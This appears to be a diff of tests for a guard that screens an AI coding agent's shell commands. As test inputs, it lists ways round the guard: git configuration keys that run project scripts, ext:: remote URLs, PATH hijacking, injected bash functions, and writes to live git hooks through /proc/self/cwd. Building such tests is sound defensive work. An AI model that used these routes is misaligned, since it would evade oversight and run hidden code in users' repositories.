@@ -5916,6 +6963,8 @@ describe("r4 B7", () => {
       "cat /proc/self/status",
       "ls /proc/self/fd",
     ], () => f9, (reason) => assert.match(reason, /relative to the process that walks it|a cd the checks do not follow|names a directory the check cannot tell/));
+    // B9-7, the maintainer's decision: with a glob in it, such a path asks.
+    b7Each("B7-9", "ask", ["cd src && cat /proc/self/cw[d]/zzz", "cd src && cat /proc/sel?/cwd/zzz", "cd src && cat /proc/thread-self/cw[d]/zzz", "cd src && cat ../mylin?/zzz"], () => f9, (reason) => assert.match(reason, /holds a glob/));
     // (Where the rules ask first, about the name itself, that stands.)
     b7Each("B7-9", ["ask", "classify"], ["cd mylink && cat src/zzz", "cat /proc/self/environ"], () => f9);
     // The direct spellings stay judged under each place; a descriptor is no such path.
@@ -5983,7 +7032,25 @@ describe("r4 B7", () => {
     // write "the guard cannot list". (A script of the project in the same call still goes to the
     // model, by B7-2: the call wrote where it runs. A program outside the project that is on the
     // safe list shows the difference.)
-    b7Each("B7-11", "allow", ["mv f f2; /bin/ls", "mv f g sub/ && /usr/bin/env ls", "mv -t sub f g; /bin/cat README.md"], one);
+    // (B8-1: a program by a path is off the safe list, so `/bin/ls` no longer shows the difference
+    // in the verdict. The session's record does: a move of plain files leaves no mark.)
+    b7Each("B7-11", "allow", ["mv f f2; ls", "mv f g sub/ && env ls", "mv -t sub f g; cat README.md"], one);
+    b7Each("B7-11", "classify", ["mv f f2; /bin/ls", "mv -t sub f g; /bin/cat README.md"], one, (reason) => assert.match(reason, /after this session wrote (sub\/)?f/));
+    for (const c of ["mv f f2", "mv f g sub/", "mv -t sub f g"]) test(`r4 B7-11: a move of plain files is recorded by name, with no mark: ${JSON.stringify(c)}`, async () => {
+      const f = one();
+      const s = new SessionState(f.dir);
+      const r = await b7Kind(f.dir, c, s);
+      assert.equal(r.kind, "allow", r.reason);
+      assert.deepEqual(s.unlisted, []);
+      assert.ok(s.touched.size + s.files.size > 0);
+    });
+    for (const c of ["mv nd scripts2", "rm f; mv nd f; mv f scripts9", "rm f; mkdir f; mv f scripts9", "mv f sub/; mkdir f; mv f scripts9", "mv nosuch scripts2", "mv n* scripts2"]) test(`r4 B7-11: a move that may bring a directory leaves a mark: ${JSON.stringify(c)}`, async () => {
+      const f = one();
+      const s = new SessionState(f.dir);
+      const r = await b7Kind(f.dir, c, s);
+      r.d.approve?.();
+      assert.ok(s.unlisted.length > 0, r.reason);
+    });
     b7Each("B7-11", "classify", ["mv f f2; ./scripts/build.sh"], one, (reason) => assert.match(reason, /after this session wrote f2/));
     // A moved directory does, in one call and in the next; so does a file something else in the
     // call names (it may be a directory by then), a source that is not there, and a glob.
@@ -5994,7 +7061,7 @@ describe("r4 B7", () => {
       "mv f sub/; mkdir f; mv f scripts9; /bin/ls",
       "mv nosuch scripts2; /bin/ls",
       "mv n* scripts2; /bin/ls",
-    ], one, (reason) => assert.match(reason, /after this command wrote files the guard cannot list/));
+    ], one);
     test("r4 B7-11: a directory moved over a path marks it for the calls after", async () => {
       const f = b7Fixture();
       assert.deepEqual(await b7Session(f, ["mv nd scripts3", () => fs.renameSync(path.join(f.dir, "nd"), path.join(f.dir, "scripts3")), "cd scripts3 && ./build.sh"]), ["allow", "classify"]);
@@ -6087,5 +7154,1920 @@ describe("r4 16: what the rules deny on the text as issued stays denied", () => 
       const d = await decideShell(guard, new SessionState(dir), dir, c);
       assert.notEqual(d.effect, "deny", `${c} -> ${d.effect}: ${d.reason}`);
     }
+  });
+});
+
+// ---- round 4, group B, eighth pass (B8): what the two checks of the seventh pass found ----
+
+// The seventh pass's project, with: an old executable named like a safe tool that sources a
+// helper (`./cat`, `bin/sort`), a helper in a directory of its own (`lib/`) that scripts in
+// sibling directories load, a package whose test runs a sibling package, a makefile in a
+// directory that runs a file of another.
+const b8Fixture = (name = "b8-") => {
+  const f = b7Fixture(name);
+  f.file("cat", "#!/bin/sh\n. ./helper.sh\n", 0o755);
+  f.file("helper.sh", "echo OLD-helper\n", 0o755);
+  f.file("bin/sort", "#!/bin/sh\n. ./helper.sh\n", 0o755);
+  f.file("lib/helper.sh", "echo OLD-lib-helper\n");
+  f.file("lib/helper.py", "print('OLD')\n");
+  f.file("scripts/sib.sh", "#!/bin/sh\n. ../lib/helper.sh\n", 0o755);
+  f.file("src/main.py", "import sys\nsys.path.insert(0, '../lib')\nimport helper\n");
+  f.file("src/app.sh", "#!/bin/sh\n. ../lib/helper.sh\n", 0o755);
+  f.file("packages/a/package.json", '{"scripts":{"test":"node ../b/index.js"}}\n');
+  f.file("packages/b/index.js", "require('../../lib/x.js')\n");
+  f.file("scripts/Makefile", "all:\n\t@../src/app.sh\n");
+  f.file("hooks.tar", "");
+  execFileSync("tar", ["-cf", "hooks.tar", "f"], { cwd: f.dir });
+  fs.copyFileSync(path.join(f.dir, "hooks.tar"), path.join(f.dir, ".git.tar"));
+  fs.symlinkSync(".git", path.join(f.dir, "gl"));
+  f.g("add", "-A");
+  f.g("commit", "-qm", "b8");
+  return f;
+};
+// Each command in a session of its own, after one edit of the session that is decided first.
+const b8After = async (f: B7, edit: string, commands: string[], want: Want | Want[], also?: RegExp) => {
+  for (const c of commands) {
+    const s = new SessionState(f.dir);
+    assert.equal((await b7Kind(f.dir, edit, s)).kind, "allow", edit);
+    const r = await b7Kind(f.dir, c, s);
+    assert.ok([want].flat().includes(r.kind), r.reason);
+    if (also) assert.match(r.reason, also, r.reason);
+  }
+};
+
+describe("r4 B8", () => {
+  let shared: B7;
+  const one = () => (shared ??= b8Fixture("b8-shared-"));
+  const d = decideModule as any;
+
+  describe("B8-1: the safe list is asked about the program that really runs", () => {
+    const edit = "echo 'echo NEW' > helper.sh";
+    // A program by a path is that file, whatever its name: off the list.
+    b7After("B8-1", "classify", ["./cat", "./cat f", "bin/sort f", "command ./cat f", "env ./cat", "timeout 5 ./cat", "exec ./cat", "nice bin/sort f", "cd bin && ./sort f", "/bin/cat f", "/usr/bin/cat f", "./cat | sort", "if ./cat; then ls; fi"], one, edit);
+    // A function of the call under a safe name is not the tool of that name.
+    b7After("B8-1", "classify", ["cat() { echo hi; }; cat f", "ls() { ./cat; }; ls", "function sort { echo hi; }; sort f", "function uniq() { echo hi; }; uniq f"], one, edit);
+    // The bare names stay, as bash finds them: a builtin, a reserved word, a file on PATH outside
+    // the project.
+    b7After("B8-1", "allow", ["cat f", "command cat f", "ls", "cd bin && sort ../f", "env cat f", "timeout 5 cat f", "sort f | uniq", "true", "echo x", "test -f f", "[ -f f ]", "for x in a b; do echo $x; done", "if [ -f f ]; then cat f; fi", "git status", "pwd", "type ls", "wc -l f"], one, edit);
+    // In a session that has written nothing all of them run as before.
+    b7Each("B8-1", "allow", ["./cat", "./cat f", "bin/sort f", "/bin/cat f", "cat f", "ls() { echo hi; }; ls"], one);
+    test("r4 B8-1: the reason names the program by its path", async () => {
+      const f = one();
+      await b8After(f, edit, ["./cat f"], "classify", /runs cat, the file \.\/cat and not the tool of that name, after this session wrote helper\.sh/);
+    });
+    test("r4 B8-1: a name PATH finds in the project, or through an entry that is no fixed directory, is not on the safe list", async () => {
+      const f = b8Fixture();
+      const was = process.env.PATH;
+      try {
+        for (const bent of [`${f.dir}/bin:${was}`, `bin:${was}`, `./bin:${was}`, `${f.dir}/gl/../bin:${was}`]) {
+          process.env.PATH = bent;
+          await b8After(f, edit, ["sort f", "sort f | uniq", "env sort f"], "classify", /PATH/);
+          // B9-8, the maintainer's decision: with such an entry before the system's directories
+          // the safe list is off after a write, for the names it does not hold as well.
+          await b8After(f, edit, ["cat f", "ls"], "classify", /PATH holds/);
+        }
+        // A builtin and a reserved word are bash's own, whatever file of that name PATH holds.
+        f.file("bin/echo", "#!/bin/sh\n. ./helper.sh\n", 0o755);
+        f.file("bin/true", "#!/bin/sh\n. ./helper.sh\n", 0o755);
+        f.file("bin/time", "#!/bin/sh\n. ./helper.sh\n", 0o755);
+        process.env.PATH = `${f.dir}/bin:${was}`;
+        await b8After(f, edit, ["echo x", "true", "time true", "if true; then echo y; fi"], "allow");
+        await b8After(f, edit, ["time ls"], "classify", /PATH holds/);
+        // An empty entry and `.` are the directory the command runs in.
+        for (const bent of [`:${was}`, `.:${was}`, `${was}:`.replace(/^/, "::")]) {
+          process.env.PATH = bent;
+          await b8After(f, edit, ["cat f"], "classify", /PATH/);
+          await b8After(f, edit, ["cd bin && sort ../f"], "classify", /PATH/);
+          // (B9-8: off the list after a write, whatever the entry holds.)
+          await b8After(f, edit, ["ls", "cd bin && cat ../f"], "classify", /PATH holds/);
+        }
+        // An entry after the one that holds the program: B10-1, the maintainer's decision
+        // ("anywhere in PATH"), turns the safe list off after a write wherever it stands.
+        process.env.PATH = `${was}:${f.dir}/bin:.`;
+        await b8After(f, edit, ["sort f", "cat f"], "classify", /PATH holds/);
+      } finally {
+        process.env.PATH = was;
+      }
+    });
+    test("r4 B8-1: an entry of PATH inside a project that lies under no temp directory", async () => {
+      // (The other projects of these tests lie under the temp directory, which counts by itself.)
+      const dir = fs.mkdtempSync(path.join(os.homedir(), "b8-project-"));
+      const was = process.env.PATH;
+      try {
+        execFileSync("git", ["-C", dir, "init", "-q", "-b", "main"]);
+        fs.mkdirSync(path.join(dir, "bin"));
+        fs.writeFileSync(path.join(dir, "bin", "sort"), "#!/bin/sh\n. ./helper.sh\n", { mode: 0o755 });
+        fs.writeFileSync(path.join(dir, "helper.sh"), "echo OLD\n");
+        fs.writeFileSync(path.join(dir, "f"), "x\n");
+        execFileSync("git", ["-C", dir, "add", "."]);
+        execFileSync("git", ["-C", dir, "commit", "-qm", "one"]);
+        process.env.PATH = `${dir}/bin:${was}`;
+        const s = new SessionState(dir);
+        assert.equal(kind(await decideShell(guard, s, dir, edit)), "allow");
+        let d = await decideShell(guard, s, dir, "sort f");
+        assert.equal(kind(d), "classify", d.reason);
+        // (B9-8: the entry is in a project: the safe list is off after a write, named so.)
+        assert.match(d.reason, /PATH holds/);
+        d = await decideShell(guard, s, dir, "cat f");
+        assert.equal(kind(d), "classify", d.reason);
+      } finally {
+        process.env.PATH = was;
+        fs.rmSync(dir, { recursive: true, force: true });
+      }
+    });
+    test("r4 B8-1: a name in an entry of PATH under the temp directory is not on the safe list", async () => {
+      const f = b8Fixture();
+      const t = fs.mkdtempSync(path.join(tmp, "b8-path-"));
+      fs.writeFileSync(path.join(t, "uniq"), "#!/bin/sh\n", { mode: 0o755 });
+      const was = process.env.PATH;
+      try {
+        process.env.PATH = `${t}:${was}`;
+        await b8After(f, edit, ["uniq f"], "classify", /PATH/);
+        // B9-8: an entry in a temp directory before the system's: the safe list is off after a
+        // write, and a write of the call (outside the project) counts as one.
+        await b8After(f, edit, ["sort f"], "classify", /PATH holds/);
+        let r = await b7Kind(f.dir, `cp cat ${t}/tac; tac f`);
+        assert.equal(r.kind, "classify", r.reason);
+        assert.match(r.reason, /PATH holds/);
+        r = await b7Kind(f.dir, `cp cat ${t}/tac; sort f`);
+        assert.equal(r.kind, "classify", r.reason);
+        // After the system's directories: B10-1 ("anywhere in PATH"), the same.
+        process.env.PATH = `${was}:${t}`;
+        await b8After(f, edit, ["uniq f", "sort f"], "classify", /PATH holds/);
+      } finally {
+        process.env.PATH = was;
+      }
+    });
+    test("r4 B8-1: a name the call itself puts into an entry of PATH inside the project", async () => {
+      const f = b8Fixture();
+      const was = process.env.PATH;
+      try {
+        process.env.PATH = `${f.dir}/bin:${was}`;
+        // Written by a command of the call: by a name, under a directory copied whole, by an archive.
+        for (const c of ["cp cat bin/uniq; uniq f", "cp cat bin/uniq & uniq f", "tar -xf a.tar -C bin; uniq f", "cp -r scripts bin; uniq f"]) {
+          const r = await b7Kind(f.dir, c);
+          assert.equal(r.kind, "classify", r.reason);
+        }
+        // (B9-8: any write of the call, elsewhere too, turns the safe list off under this PATH.)
+        const r = await b7Kind(f.dir, "echo x > sub/n.txt; uniq f");
+        assert.equal(r.kind, "classify", r.reason);
+      } finally {
+        process.env.PATH = was;
+      }
+    });
+    test("r4 B8-1: a function the environment hands to bash under a safe name", async () => {
+      const f = one();
+      process.env["BASH_FUNC_ls%%"] = "() { ./cat; }";
+      try {
+        await b8After(f, edit, ["ls"], "classify", /function/);
+        await b8After(f, edit, ["cat f"], "allow");
+      } finally {
+        delete process.env["BASH_FUNC_ls%%"];
+      }
+    });
+  });
+
+  describe("B8-2: git's configuration, by a list of keys that name no program", () => {
+    const edit = "echo x > note.txt";
+    const EVERYDAY = ["git status", "git status --short", "git diff", "git log --oneline -3", "git show HEAD", "git branch", "git add note.txt", "git commit -m x", "git fetch", "git rev-parse HEAD", "git ls-files", "git tag v2", "git blame f", "git stash list", "git remote -v", "git ls-remote origin", "git cat-file -p HEAD:f", "git cat-file -t HEAD", "git ls-files -s", "git ls-files --others --exclude-standard", "git ls-files -m", "git clean -n", "git config --get user.name", "git worktree list"];
+    test("r4 B8-2: a plain clone keeps every git command of the safe list after a write", async () => {
+      await b8After(one(), edit, EVERYDAY, "allow");
+    });
+    // One key of the repository's own configuration that names, or may name, a program.
+    const BAD: [string, string, RegExp?][] = [
+      ["core.fsmonitor", "./helper.sh"],
+      ["core.sshCommand", "./helper.sh"],
+      ["core.gitProxy", "./helper.sh"],
+      ["remote.origin.uploadpack", "./helper.sh"],
+      ["remote.origin.receivepack", "./helper.sh"],
+      ["gpg.program", "./helper.sh"],
+      ["gpg.ssh.program", "./helper.sh"],
+      ["gpg.x509.program", "./helper.sh"],
+      ["core.pager", "./helper.sh"],
+      ["core.editor", "./helper.sh"],
+      ["sequence.editor", "./helper.sh"],
+      ["core.askPass", "./helper.sh"],
+      ["diff.external", "./helper.sh"],
+      ["diff.x.command", "./helper.sh"],
+      ["diff.x.textconv", "./scripts/conv.sh"],
+      ["filter.x.clean", "./scripts/conv.sh"],
+      ["filter.demo.smudge", "/usr/bin/tar -xf- --to-command=./helper.sh"],
+      ["filter.lfs.clean", "git-lfs clean -- %f --also"],
+      ["filter.lfs.process", "git-lfs filter-process; ./helper.sh"],
+      ["filter.x.clean", "cat"],
+      ["merge.x.driver", "./helper.sh %O %A %B"],
+      ["credential.helper", "./helper.sh"],
+      ["credential.helper", "store"],
+      ["core.hooksPath", ".husky/_"],
+      ["alias.st", "!./helper.sh"],
+      ["protocol.ext.allow", "always"],
+      ["remote.origin.vcs", "x"],
+      ["remote.other.url", "ext::./helper.sh"],
+      ["remote.other.pushurl", "ext::./helper.sh %S"],
+      ["url.ext::./helper.sh .insteadOf", "https://example.invalid/", /url\.ext::/],
+      ["url.https://example.invalid/.insteadOf", "ext::./helper.sh"],
+      ["submodule.x.update", "!./helper.sh"],
+      ["pager.log", "./helper.sh"],
+      ["uploadpack.packObjectsHook", "./helper.sh"],
+      ["sendemail.smtpServer", "./helper.sh"],
+      ["include.path", "../shared.gitconfig", /include\.path/],
+      ["some.unheardOf", "x"],
+    ];
+    for (const [key, value, named] of BAD) test(`r4 B8-2: ${key}=${value} in the repository's configuration: every git command goes to the model after a write, with the key named`, async () => {
+      const f = b8Fixture();
+      f.g("config", key, value);
+      const re = named ?? new RegExp(key.toLowerCase().replace(/[.*+?^${}()|[\]\\]/g, "\\$&"));
+      await b8After(f, edit, ["git status", "git diff", "git fetch", "git commit -m x", "git branch", "git rev-parse HEAD", "git log --oneline -3", "git ls-remote origin", "git tag v2", "git -C src status", "git ls-files", "git cat-file -p HEAD:f", "git cat-file --textconv HEAD:f", "git clean -n", "git config --get user.name", "git worktree list", "git stash list", "git stash", "git bisect log"], "classify", re);
+      // In a session that has written nothing they run as before.
+      for (const c of ["git status", "git diff", "git log --oneline -3"]) {
+        const r = await b7Kind(f.dir, c);
+        assert.equal(r.kind, "allow", r.reason);
+      }
+      // What is no git command is not held to git's configuration.
+      await b8After(f, edit, ["ls", "cat f"], "allow");
+    });
+    // The keys everyday repositories hold: none names a program.
+    const GOOD: [string, string][][] = [
+      [["filter.lfs.clean", "git-lfs clean -- %f"], ["filter.lfs.smudge", "git-lfs smudge -- %f"], ["filter.lfs.process", "git-lfs filter-process"], ["filter.lfs.required", "true"], ["lfs.repositoryformatversion", "0"]],
+      [["filter.lfs.smudge", "git-lfs smudge --skip -- %f"], ["filter.lfs.process", "git-lfs filter-process --skip"], ["diff.lfs.textconv", "cat"]],
+      [["filter.git-crypt.smudge", '"git-crypt" smudge'], ["filter.git-crypt.clean", '"git-crypt" clean'], ["filter.git-crypt.required", "true"], ["diff.git-crypt.textconv", '"git-crypt" diff']],
+      [["branch.plain.remote", "origin"], ["branch.plain.merge", "refs/heads/plain"], ["branch.plain.rebase", "true"], ["branch.plain.description", "x"], ["branch.autoSetupRebase", "always"]],
+      [["user.signingkey", "ABCDEF12"], ["gpg.format", "ssh"], ["commit.gpgsign", "true"], ["tag.gpgsign", "true"]],
+      [["url.git@github.com:.insteadOf", "https://github.com/"], ["url.ssh://git@example.invalid/.pushInsteadOf", "https://example.invalid/"]],
+      [["core.autocrlf", "input"], ["pull.rebase", "true"], ["push.autoSetupRemote", "true"], ["push.default", "current"], ["fetch.prune", "false"], ["rebase.autoStash", "true"], ["merge.conflictStyle", "zdiff3"], ["core.excludesFile", ".git/info/exclude2"]],
+      [["http.https://github.com/.extraheader", "AUTHORIZATION: basic eA=="], ["http.sslVerify", "true"], ["remote.origin.pushurl", "https://example.invalid/x.git"]],
+      [["diff.json.xfuncname", "^x"], ["diff.bin.binary", "true"], ["diff.renames", "true"], ["status.showUntrackedFiles", "all"], ["submodule.lib.update", "none"], ["submodule.lib.url", "https://example.invalid/lib.git"]],
+    ];
+    for (const keys of GOOD) test(`r4 B8-2: the repository keeps its git commands after a write with ${keys.map(([k]) => k).join(", ")}`, async () => {
+      const f = b8Fixture();
+      for (const [k, v] of keys) f.g("config", k, v);
+      await b8After(f, edit, ["git status", "git diff", "git log --oneline -3", "git add note.txt", "git branch", "git rev-parse HEAD", "git blame f"], "allow");
+    });
+    test("r4 B8-2: git-lfs's lines stand only for a git-lfs that PATH finds outside the project", async () => {
+      const f = b8Fixture();
+      f.g("config", "filter.lfs.clean", "git-lfs clean -- %f");
+      f.file("bin/git-lfs", "#!/bin/sh\n. ./helper.sh\n", 0o755);
+      const was = process.env.PATH;
+      try {
+        process.env.PATH = `${f.dir}/bin:${was}`;
+        // (B9-8: such a PATH turns the safe list off after a write before the key is read.)
+        await b8After(f, edit, ["git status", "git add note.txt"], "classify", /PATH holds/);
+        // After the system's directories, where the machine has no git-lfs of its own, PATH finds
+        // the project's: the line does not stand.
+        let system = true;
+        try {
+          execFileSync("sh", ["-c", "command -v git-lfs"], { env: { PATH: was }, stdio: "ignore" });
+        } catch {
+          system = false;
+        }
+        // (B10-1: such an entry anywhere in PATH turns the safe list off after a write first.)
+        process.env.PATH = `${was}:${f.dir}/bin`;
+        if (!system) await b8After(f, edit, ["git status", "git add note.txt"], "classify", /PATH holds/);
+      } finally {
+        process.env.PATH = was;
+      }
+      await b8After(f, edit, ["git status", "git add note.txt"], "allow");
+    });
+    test("r4 B8-2: a file the configuration includes: its keys are read, and a file of the project asks for the model", async () => {
+      const f = b8Fixture();
+      fs.writeFileSync(path.join(f.dir, ".git", "extra.cfg"), "[user]\n\tname = other\n");
+      f.g("config", "include.path", "extra.cfg");
+      await b8After(f, edit, ["git status", "git diff"], "allow");
+      fs.writeFileSync(path.join(f.dir, ".git", "extra.cfg"), "[core]\n\tfsmonitor = ./helper.sh\n");
+      await b8After(f, edit, ["git status", "git diff"], "classify", /core\.fsmonitor/);
+      // A file in the work tree is one the session can write between the check and the run.
+      fs.writeFileSync(path.join(f.dir, ".git", "extra.cfg"), "[user]\n\tname = other\n");
+      f.file("shared.gitconfig", "[user]\n\tname = shared\n");
+      f.g("config", "--add", "include.path", "../shared.gitconfig");
+      await b8After(f, edit, ["git status", "git diff"], "classify", /include\.path/);
+      f.g("config", "--unset-all", "include.path");
+      // ... and so is one under a temp directory, outside the project.
+      fs.writeFileSync(path.join(tmp, "b8-included.cfg"), "[user]\n\tname = temp\n");
+      f.g("config", "include.path", path.join(tmp, "b8-included.cfg"));
+      await b8After(f, edit, ["git status", "git diff"], "classify", /include\.path/);
+      f.g("config", "--unset-all", "include.path");
+      // One outside both is the user's own.
+      const mine = path.join(os.homedir(), "b8-included.cfg");
+      fs.writeFileSync(mine, "[user]\n\tname = mine\n");
+      f.g("config", "include.path", mine);
+      await b8After(f, edit, ["git status", "git diff"], "allow");
+      fs.writeFileSync(mine, "[core]\n\tpager = ./helper.sh\n");
+      await b8After(f, edit, ["git status"], "classify", /core\.pager/);
+      fs.rmSync(mine);
+      f.g("config", "--unset-all", "include.path");
+      f.g("config", "includeIf.gitdir:/.path", "../shared.gitconfig");
+      await b8After(f, edit, ["git status", "git diff"], "classify", /includeif\./);
+    });
+    test("r4 B8-2: a key of the work tree's own configuration file counts as the repository's", async () => {
+      const f = b8Fixture();
+      f.g("config", "extensions.worktreeConfig", "true");
+      await b8After(f, edit, ["git status"], "allow");
+      f.g("config", "--worktree", "core.fsmonitor", "./helper.sh");
+      await b8After(f, edit, ["git status", "git diff"], "classify", /core\.fsmonitor/);
+    });
+    test("r4 B8-2: the user's own configuration is not the project's: only its filters and diff programs are read, as before", async () => {
+      const f = b8Fixture();
+      const was = process.env.GIT_CONFIG_GLOBAL;
+      const own = path.join(tmp, `b8-global-${path.basename(f.dir)}`);
+      const base = was ? fs.readFileSync(was, "utf8") : "";
+      try {
+        process.env.GIT_CONFIG_GLOBAL = own;
+        fs.writeFileSync(own, `${base}[core]\n\tfsmonitor = false\n\tpager = less -FRX\n\teditor = vim\n[credential]\n\thelper = store\n[alias]\n\tst = status\n[filter "lfs"]\n\tclean = git-lfs clean -- %f\n\tsmudge = git-lfs smudge -- %f\n\tprocess = git-lfs filter-process\n\trequired = true\n`);
+        await b8After(f, edit, ["git status", "git diff", "git log --oneline -3", "git commit -m x"], "allow");
+        fs.writeFileSync(own, `${base}[filter "y"]\n\tclean = ./scripts/conv.sh\n`);
+        await b8After(f, edit, ["git status", "git add note.txt"], "classify", /filter\.y\.clean/);
+        fs.writeFileSync(own, `${base}[filter "y"]\n\tclean = /usr/bin/tar -xf- --to-command=helper.sh\n`);
+        await b8After(f, edit, ["git status"], "classify", /filter\.y\.clean/);
+      } finally {
+        if (was === undefined) delete process.env.GIT_CONFIG_GLOBAL;
+        else process.env.GIT_CONFIG_GLOBAL = was;
+      }
+    });
+    test("r4 B8-2: a cloned submodule's configuration is read with the repository's", async () => {
+      const f = b8Fixture();
+      const lib = `${f.dir}-lib`;
+      execFileSync("git", ["init", "-q", "-b", "main", lib]);
+      execFileSync("git", ["-C", lib, "commit", "-q", "--allow-empty", "-m", "lib"]);
+      f.g("-c", "protocol.file.allow=always", "submodule", "--quiet", "add", lib, "vendor/lib");
+      f.g("commit", "-qm", "submodule");
+      await b8After(f, edit, ["git status", "git diff", "git fetch"], "allow");
+      execFileSync("git", ["-C", path.join(f.dir, "vendor/lib"), "config", "core.fsmonitor", "./helper.sh"]);
+      await b8After(f, edit, ["git status", "git diff", "git fetch"], "classify", /core\.fsmonitor/);
+    });
+    test("r4 B8-2: a program named in the configuration is outside the project only as the list says (D1's own status)", () => {
+      const top = one().dir;
+      const inside = (p: string) => p.startsWith(top);
+      assert.equal(typeof d.outsideProgram, "function");
+      for (const v of ["/usr/bin/tar -xf- --to-command=./helper.sh", "/usr/bin/tar -xf- --to-command=helper.sh", "/usr/bin/tar --to-command helper.sh", "/usr/bin/cat --files0-from=scripts", "/usr/bin/cat -s ./f", "/usr/bin/env cat", "./scripts/conv.sh"]) assert.equal(d.outsideProgram(v, top, inside), false, v);
+      for (const v of ["/usr/bin/cat", "/usr/bin/cat --number", "/usr/bin/cat -- %f", "/usr/bin/tr a-z A-Z"]) assert.equal(d.outsideProgram(v, top, inside), true, v);
+    });
+  });
+
+  describe("B8-3: any session write counts for the whole project", () => {
+    const edit = "echo 'echo NEW' > lib/helper.sh";
+    b7After("B8-3", "classify", ["cd scripts && ./sib.sh", "cd src && python3 main.py", "cd src && ./app.sh", "cd packages/a && npm test", "cd packages/a && npm run test", "cd scripts && make", "make -C scripts", "cd tools && ./check.sh", "cd sub && bash ../tools/check.sh", "cd src && node index.ts", "(cd scripts && ./sib.sh)", "cd tools && sh check.sh"], one, edit);
+    // The safe list is not about places.
+    b7After("B8-3", "allow", ["cd scripts && ls", "cd scripts && cat sib.sh", "git status", "cd src && grep -rn main .", "cd scripts && git log --oneline -1", "cd sub && wc -l notes.txt"], one, edit);
+    test("r4 B8-3: a write and a run in a sibling directory in one call", async () => {
+      const f = one();
+      for (const c of ["echo 'echo NEW' > lib/helper.sh; cd scripts && ./sib.sh", "printf x > lib/n.txt && make -C scripts", "sed -i s/OLD/NEW/ lib/helper.py; cd src && python3 main.py", "cp f lib/g; cd packages/a && npm test"]) {
+        const r = await b7Kind(f.dir, c);
+        assert.equal(r.kind, "classify", r.reason);
+        assert.match(r.reason, /after this session wrote/);
+      }
+    });
+    test("r4 B8-3: a write by the edit tool in a sibling directory", async () => {
+      const f = one();
+      const s = new SessionState(f.dir);
+      assert.equal(decideFile(guard, s, f.dir, path.join(f.dir, "lib", "helper.sh")), undefined);
+      for (const c of ["cd scripts && ./sib.sh", "cd src && python3 main.py", "make -C scripts", "cd packages/a && npm test"]) {
+        const r = await b7Kind(f.dir, c, s);
+        assert.equal(r.kind, "classify", r.reason);
+        assert.match(r.reason, /after this session wrote .*helper\.sh/);
+      }
+    });
+    test("r4 B8-3: a write outside every project root keeps its reach: where the program lives or runs, or below", async () => {
+      const f = one();
+      const out = fs.mkdtempSync(path.join(tmp, "b8-outside-"));
+      fs.writeFileSync(path.join(out, "Makefile"), "all:\n\t@true\n");
+      for (const c of [`echo x > ${out}/n.txt; cd scripts && ./sib.sh`, `echo x > ${out}/n.txt; ./scripts/build.sh`, `echo x > ${out}/n.txt; make -C scripts`]) {
+        const r = await b7Kind(f.dir, c);
+        assert.equal(r.kind, "allow", r.reason);
+      }
+      for (const c of [`echo x > ${out}/n.txt; cd ${out} && make`, `echo x > ${out}/n.txt; make -C ${out}`]) {
+        const r = await b7Kind(f.dir, c);
+        assert.equal(r.kind, "classify", r.reason);
+      }
+    });
+    test("r4 B8-3: the reach of a write the checks cannot list stays as built: its directory, and what lies above and below", async () => {
+      const f = b8Fixture();
+      // An archive unpacked into `sub`: a mark on `sub`, not on its siblings.
+      assert.deepEqual(await b7Session(f, ["tar -xf a.tar -C sub", "cd scripts && ./sib.sh", "cd sub && bash ../tools/check.sh"]), ["allow", "allow", "classify"]);
+    });
+  });
+
+  describe("B8-4: an attached value behind clustered short options", () => {
+    let f4: B7;
+    const was = process.cwd();
+    before(() => {
+      f4 = b8Fixture("b8-4-");
+      // The deciding process stands in the project, as opencode's does.
+      process.chdir(f4.dir);
+    });
+    after(() => process.chdir(was));
+    b7Each("B8-4", "classify", [
+      "cd src && cp -vt../mylink ../f",
+      "cd src && cp -vft../mylink ../f",
+      "cd src && mv -vt../mylink ../g",
+      "cd src && ln -svt../mylink ../f",
+      "cd src && install -vt../mylink ../f",
+      "cd src && sort -uo../mylink/x main.c",
+      "cd src && tar -xvC../mylink -f ../a.tar",
+      "cd src && tar -xvf../a.tar -C../mylink",
+      "cd src && grep -rnf../mylink/names.txt .",
+      "cd src && du -aX../mylink/names.txt",
+      "cd src && cp -vt/proc/self/root/proc/self/cwd ../f",
+    ], () => f4, (reason) => assert.match(reason, /\/proc/));
+    // (Whatever else these are today, none is a rule allow.)
+    b7Each("B8-4", ["classify", "ask"], ["cd src && install -Dvm644t../mylink ../f", "cd src && unzip -qod../mylink ../a.zip", "cd src && rsync -avT../mylink ../sub/ dest/", "cd src && curl -sSo../mylink/x http://127.0.0.1:9/", "cd src && wget -qO../mylink/x http://127.0.0.1:9/", "cd src && xargs -0a../mylink/names.txt echo"], () => f4);
+    // The direct spelling of the directory itself, attached: judged under the place, as a read
+    // and as a write there.
+    b7Each("B8-4", "ask", ["cd .git/hooks && cp -vt/proc/self/cwd ../../f", "cd .git/hooks && cp -t/proc/self/cwd ../../f", "cd .git/hooks && sort -uo/proc/self/cwd/pre-commit ../../f", "cd src && grep -vf/proc/self/cwd/zzz main.c", "cd src && grep -vnf/proc/thread-self/cwd/zzz main.c"], () => f4);
+    // ... and so is the same spelling as a word of its own, or behind `=`: which word a program
+    // writes is its own table (these were rule allows that wrote a live hook, sandbox off).
+    b7Each("B8-4", "ask", ["cd .git/hooks && echo x > /proc/self/cwd/pre-commit", "cd .git/hooks && cp ../../f /proc/self/cwd/pre-commit", "cd .git/hooks && cp --target-directory=/proc/self/cwd ../../f", "cd .git/hooks && sort -o /proc/self/cwd/pre-commit ../../f", "cd .git/hooks && tee /proc/self/cwd/pre-commit < ../../f", "cd src && cp ../f /proc/self/cwd/../AGENTS.md", "cd .git && cp ../f /proc/thread-self/cwd/config"], () => f4, (reason) => assert.match(reason, /\.git|opencode or a git hook/));
+    // An attached value is judged as a write too: here one that lands outside the project.
+    // (After a `cd` out of the project the plugin's own reading of the word stays in it.)
+    b7Each("B8-4", "ask", ["cd /usr && sort -uo/proc/self/cwd/b8x /etc/hostname", "cd /usr && sort -o/proc/self/cwd/b8x /etc/hostname", "cd /usr && sort --output=/proc/self/cwd/b8x /etc/hostname", "cd /usr && sort --outp=/proc/thread-self/cwd/b8x /etc/hostname"], () => f4, (reason) => assert.match(reason, /which is \/usr\/b8x where it runs: edit outside the working directory/));
+    // A program that only reads what its words name is not held to the places a write is.
+    b7Each("B8-4", "allow", ["cat /proc/self/cwd/AGENTS.md", "ls ~+/src/*", "cd src && ls /proc/self/cwd/..", "cd src && wc -l /proc/self/cwd/../AGENTS.md"], () => f4);
